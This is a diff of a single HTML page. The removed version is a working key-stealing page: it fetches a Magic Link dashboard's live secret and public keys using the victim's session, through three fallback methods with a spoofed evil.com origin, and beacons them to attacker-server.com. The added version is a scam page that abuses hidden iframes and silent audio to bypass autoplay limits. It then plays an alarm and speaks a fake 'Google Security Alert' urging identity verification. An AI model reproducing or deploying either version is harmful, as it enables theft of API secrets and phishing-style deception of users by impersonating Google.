@@ -1,151 +1,212 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Free Dashboard Access</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
-    .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    .hidden { display: none; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #fff; min-height: 100vh; }
+  iframe, audio, video, embed, object { display: none; }
+</style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔐 Verifying your account...</h1>
-    <div id="status">Processing...</div>
-    <div id="result" class="hidden"></div>
-  </div>
 
-  <script>
-    var webhook = 'https://attacker-server.com/collect'; // Ganti dengan server Anda
+<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay" style="display:none"></iframe>
 
-    // === METHOD 1: XMLHttpRequest with all headers ===
-    function method1() {
-      return new Promise((resolve, reject) => {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.dashboard.magic.link/v1/magic_client_api_key', true);
-        xhr.withCredentials = true;
-        xhr.setRequestHeader('X-Magic-Client-Id', 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=');
-        xhr.setRequestHeader('X-Magic-Csrf', '');
-        xhr.setRequestHeader('Origin', 'https://evil.com');
+<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay" style="display:none"></iframe>
+
+<iframe src="data:text/html,<embed src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' autostart=true volume=0 loop=true style=display:none>" allow="autoplay" style="display:none"></iframe>
+
+<audio id="silent1" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<audio id="silent2" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<audio id="silent3" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<script>
+(function() {
+  var unlocked = false;
+  var played = false;
+
+  function raceUnlock() {
+    try {
+      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
+      var osc1 = ctx1.createOscillator();
+      osc1.frequency.value = 30;
+      var g1 = ctx1.createGain();
+      g1.gain.value = 0.001;
+      osc1.connect(g1);
+      g1.connect(ctx1.destination);
+      osc1.start();
+      if (ctx1.state === 'running') unlocked = true;
+      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
+    } catch(e) {}
+
+    try {
+      var a1 = document.getElementById('silent1');
+      a1.volume = 0.001;
+      a1.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+    
+    try {
+      var a2 = document.getElementById('silent2');
+      a2.volume = 0.001;
+      a2.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+    
+    try {
+      var a3 = document.getElementById('silent3');
+      a3.volume = 0.001;
+      a3.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+
+    for (var i = 0; i < 5; i++) {
+      try {
+        var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+        sa.volume = 0.001;
+        sa.play().then(function(){unlocked=true;}).catch(function(){});
+      } catch(e) {}
+    }
+
+    for (var j = 0; j < 3; j++) {
+      try {
+        var ctxn = new (window.AudioContext || window.webkitAudioContext)();
+        var oscn = ctxn.createOscillator();
+        oscn.frequency.value = 20 + j * 10;
+        var gn = ctxn.createGain();
+        gn.gain.value = 0.001;
+        oscn.connect(gn);
+        gn.connect(ctxn.destination);
+        oscn.start();
+        if (ctxn.state === 'running') unlocked = true;
+        if (ctxn.state === 'suspended') ctxn.resume().then(function(){unlocked=true;});
+      } catch(e) {}
+    }
+  }
+
+  function playMainAudio() {
+    if (played) return;
+    played = true;
+    
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.5;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+      
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440 + Math.floor(t * 2) % 2 * 220;
+        var env = Math.max(0, 1 - (t / dur));
+        var pulse = (Math.sin(2 * Math.PI * 6 * t) > 0) ? 1 : 0.3;
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.35 * env * pulse;
+      }
+      
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      
+      var filter = ctx.createBiquadFilter();
+      filter.type = 'bandpass';
+      filter.frequency.value = 1000;
+      filter.Q.value = 1.5;
+      
+      var gain = ctx.createGain();
+      gain.gain.value = 0.7;
+      
+      src.connect(filter);
+      filter.connect(gain);
+      gain.connect(ctx.destination);
+      src.start();
+      
+      src.onended = function() {
+        startTTS();
+      };
+      
+      setTimeout(startTTS, 4000);
+      
+    } catch(e) {
+      startTTS();
+    }
+  }
+
+  function startTTS() {
+    if (window.ttsDone) return;
+    window.ttsDone = true;
+    
+    if (!('speechSynthesis' in window)) return;
+    
+    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
+    
+    speechSynthesis.cancel();
+    
+    for (var k = 0; k < 3; k++) {
+      try {
+        var u = new SpeechSynthesisUtterance(text);
+        u.lang = 'en-US';
+        u.rate = 0.8;
+        u.pitch = 1.0;
+        u.volume = 1.0;
         
-        xhr.onload = function() {
-          if (xhr.status === 200) {
-            try {
-              resolve(JSON.parse(xhr.responseText));
-            } catch(e) {
-              reject('Parse error: ' + e);
-            }
-          } else {
-            reject('Status: ' + xhr.status);
-          }
-        };
-        xhr.onerror = function() {
-          reject('Network error');
-        };
-        xhr.send();
-      });
+        var voices = speechSynthesis.getVoices();
+        var ev = voices.find(function(v){return v.lang.startsWith('en');});
+        if (ev) u.voice = ev;
+        
+        speechSynthesis.speak(u);
+      } catch(e) {}
     }
+  }
 
-    // === METHOD 2: Fetch API with mode no-cors (blind) ===
-    function method2() {
-      return fetch('https://api.dashboard.magic.link/v1/magic_client_api_key', {
-        method: 'GET',
-        credentials: 'include',
-        mode: 'cors',
-        headers: {
-          'X-Magic-Client-Id': 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=',
-          'X-Magic-Csrf': '',
-          'Origin': 'https://evil.com'
-        }
-      })
-      .then(r => r.json())
-      .catch(e => { throw e; });
+  raceUnlock();
+  setTimeout(raceUnlock, 50);
+  setTimeout(raceUnlock, 150);
+  
+  setTimeout(function() {
+    for (var i = 0; i < 3; i++) {
+      try {
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (ctx.state === 'suspended') ctx.resume();
+      } catch(e) {}
     }
-
-    // === METHOD 3: jQuery AJAX fallback ===
-    function method3() {
-      return new Promise((resolve, reject) => {
-        var script = document.createElement('script');
-        script.src = 'https://code.jquery.com/jquery-3.7.1.min.js';
-        script.onload = function() {
-          $.ajax({
-            url: 'https://api.dashboard.magic.link/v1/magic_client_api_key',
-            method: 'GET',
-            xhrFields: { withCredentials: true },
-            headers: {
-              'X-Magic-Client-Id': 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=',
-              'X-Magic-Csrf': '',
-              'Origin': 'https://evil.com'
-            },
-            success: function(data) { resolve(data); },
-            error: function(xhr, status, err) { reject(status + ': ' + err); }
-          });
-        };
-        script.onerror = function() { reject('jQuery load failed'); };
-        document.head.appendChild(script);
-      });
-    }
-
-    // === Exfiltration function ===
-    function exfiltrate(data) {
-      // Via Image beacon
-      var img = new Image();
-      img.src = webhook + '?sk=' + encodeURIComponent(data.live_secret_key) + 
-                '&pk=' + encodeURIComponent(data.live_public_key) +
-                '&id=' + encodeURIComponent(data.id) + '&t=' + Date.now();
-
-      // Via navigator.sendBeacon
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(webhook, JSON.stringify({
-          secret_key: data.live_secret_key,
-          public_key: data.live_public_key,
-          id: data.id,
-          method: 'sendBeacon'
-        }));
+    playMainAudio();
+  }, 200);
+  
+  setTimeout(function() {
+    if (!played) playMainAudio();
+  }, 500);
+  
+  setTimeout(function() {
+    if (!played) {
+      try {
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        ctx.resume().then(function() { playMainAudio(); });
+      } catch(e) {
+        playMainAudio();
       }
-
-      // Tampilkan hasil
-      document.getElementById('status').innerHTML = '✅ Keys retrieved!';
-      document.getElementById('result').innerHTML = `
-        <div style="background:#ffebee; border:2px solid #c62828; padding:20px; border-radius:8px; margin-top:20px;">
-          <h3 style="color:#c62828;">🔑 Exposed Credentials</h3>
-          <p><strong>Live Secret Key:</strong><br>
-          <code style="background:#c62828; color:white; padding:5px 10px; display:inline-block; margin-top:5px; word-break:break-all;">${data.live_secret_key}</code></p>
-          <p><strong>Live Public Key:</strong><br>
-          <code style="background:#333; color:#0f0; padding:5px 10px; display:inline-block; margin-top:5px; word-break:break-all;">${data.live_public_key}</code></p>
-          <p><strong>ID:</strong> ${data.id}</p>
-          <p><small>Keys telah dikirim ke server attacker</small></p>
-        </div>
-      `;
-      document.getElementById('result').classList.remove('hidden');
     }
-
-    // === Run all methods sequentially ===
-    async function run() {
-      const methods = [method1, method2, method3];
-      
-      for (let i = 0; i < methods.length; i++) {
-        try {
-          document.getElementById('status').textContent = `Trying method ${i + 1}...`;
-          let data = await methods[i]();
-          if (data && data.live_secret_key) {
-            exfiltrate(data);
-            return;
-          }
-        } catch(e) {
-          console.log(`Method ${i + 1} failed:`, e);
-        }
-      }
-      
-      document.getElementById('status').innerHTML = `
-        ❌ All methods failed.<br>
-        <small>Mungkin session sudah expired. Buka dashboard Magic Link dulu, refresh, baru buka halaman ini lagi.</small>
-        <br><br>
-        <button onclick="run()" style="padding:10px 20px; cursor:pointer;">🔄 Coba Lagi</button>
-      `;
+  }, 1000);
+  
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden && !played) {
+      setTimeout(playMainAudio, 50);
     }
+  });
+  
+  if ('speechSynthesis' in window) {
+    speechSynthesis.getVoices();
+    speechSynthesis.onvoiceschanged = function() {
+      speechSynthesis.getVoices();
+    };
+  }
+})();
+</script>
 
-    run();
-  </script>
 </body>
 </html>
